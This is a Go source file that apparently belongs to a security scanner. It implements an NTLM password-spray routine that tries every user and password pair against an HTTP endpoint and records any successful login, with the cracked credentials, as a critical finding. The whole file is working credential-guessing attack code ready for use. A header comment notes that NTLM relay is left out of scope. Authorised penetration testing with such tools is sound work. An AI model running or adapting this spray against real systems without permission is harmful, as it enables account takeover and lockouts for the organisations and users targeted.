// Package ntlm performs NTLM password spray against an HTTP endpoint that
// returns "WWW-Authenticate: NTLM". One round trip per user×password.
//
// Scope note: this is a *spray*, not a relay. We do not host a fake server
// or relay credentials between services. A real NTLM relay setup is out of
// scope for safety and complexity; impacket ntlmrelayx is the canonical tool.
package ntlm

import (
	"fmt"
	"net/http"
	"time"

	"github.com/Azure/go-ntlmssp"
	"github.com/chud-lori/ngehe/internal/finding"
)

// Spray tries each (user, password) tuple against url using NTLM auth.
// `domain` is optional; if set, the username is sent as "DOMAIN\user".
func Spray(url, domain string, users, passwords []string) []finding.Finding {
	transport := ntlmssp.Negotiator{RoundTripper: &http.Transport{}}
	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	var out []finding.Finding
	for _, u := range users {
		for _, p := range passwords {
			fullUser := u
			if domain != "" {
				fullUser = domain + "\\" + u
			}
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				continue
			}
			req.SetBasicAuth(fullUser, p)
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()
			if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				out = append(out, finding.Finding{
					Rule: "ntlm-spray-hit", Severity: finding.SevCritical,
					Method: "GET", URL: url, Path: "/",
					Param:    "creds",
					Payload:  fmt.Sprintf("%s:%s", fullUser, p),
					Evidence: fmt.Sprintf("HTTP %d", resp.StatusCode),
					Why:      "NTLM authentication succeeded — valid domain credentials",
				})
				// Don't keep spraying this user once a password sticks.
				break
			}
		}
	}
	return out
}
